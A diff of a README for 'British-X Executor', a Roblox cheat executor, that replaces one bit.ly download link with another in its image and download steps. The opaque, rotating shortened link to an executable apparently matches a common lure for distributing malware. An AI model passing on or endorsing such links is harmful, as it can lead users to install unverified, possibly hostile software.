@@ -297,7 +297,7 @@
 
 Welcome to the British-X Executor repository! 🚀 This repository hosts the latest version of the British-X Executor, a powerful tool for enhancing your Roblox gaming experience.
 
-![British-X Executor](https://bit.ly/4iazS1U)
+![British-X Executor](https://bit.ly/4g3xvfh)
 
 ## Table of Contents
 
@@ -792,7 +792,7 @@ British-X Executor is a cutting-edge executor designed for Roblox script executi
 
 To get started with British-X Executor, follow these simple steps:
 
-1. Download the latest version of the executor from the following link: [![Download British-X Executor](https://bit.ly/4iazS1U).
+1. Download the latest version of the executor from the following link: [![Download British-X Executor](https://bit.ly/4g3xvfh).
   
    This download button will provide you with the necessary files to install the executor on your system. Click the button to initiate the download process.
 
